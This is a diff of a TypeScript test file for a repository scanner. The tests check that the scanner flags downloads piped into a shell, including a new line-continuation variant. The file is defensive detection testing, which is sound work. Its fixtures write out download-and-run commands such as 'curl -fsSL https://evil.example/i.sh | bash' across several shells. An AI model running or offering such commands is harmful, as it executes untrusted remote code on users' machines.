@@ -12,6 +12,7 @@ const PIPED: Record<string, string> = {
   "curl | bash": "curl -fsSL https://evil.example/i.sh | bash",
   "curl | /bin/sh": "curl -fsSL https://evil.example/i.sh | /bin/sh",
   "curl | sh -s --": "curl -fsSL https://evil.example/i.sh | sh -s -- --yes",
+  "curl | continued sh": "curl -fsSL https://evil.example/i.sh | sh\\\n -s",
   "curl | dash": "curl -fsSL https://evil.example/i.sh | dash",
   "curl | ksh": "curl -fsSL https://evil.example/i.sh | ksh",
   "curl | ash": "curl -fsSL https://evil.example/i.sh | ash",
@@ -57,6 +58,7 @@ test("a download that is not handed to a shell keeps no unsafe-execution finding
     "wget -qO- https://example.com/notes.txt | grep sh",
     "curl -fsSL https://example.com/data | /usr/local/bin/fish-wrapper",
     "curl -fsSL https://example.com/data | echo;/bin/sh",
+    "curl -fsSL https://example.com/data | fish\\\n-wrapper",
   ]) {
     const inspection = inspectRepository({
       files: [
@@ -81,14 +83,18 @@ test("changed execution rules cannot reuse the old clean source inventory", () =
       {
         path: "scripts/bootstrap.sh",
         bytes: new TextEncoder().encode(
-          "curl -fsSL https://evil.example/i.sh | /bin/sh\n",
+          'curl -fsSL "$INSTALLER_URL" | /bin/sh\n',
         ),
       },
     ],
   });
   // The same file and classifications produced this key before the shell
   // rule changed. That clean assessment must not bypass the new finding.
+  expect(inspection.visibilityGaps).toEqual([]);
+  expect(inspection.findings.map((finding) => finding.category)).toContain(
+    "unsafe-execution",
+  );
   expect(inspection.inventorySha256).not.toBe(
-    "fd5bc484403cd017616afecc4032dc4ed44a6392774a36beca3fc246d8340d3f",
+    "5a360062a35b222a16b388963fc685803f5fd82ec50bf3a277dcd80332833917",
   );
 });
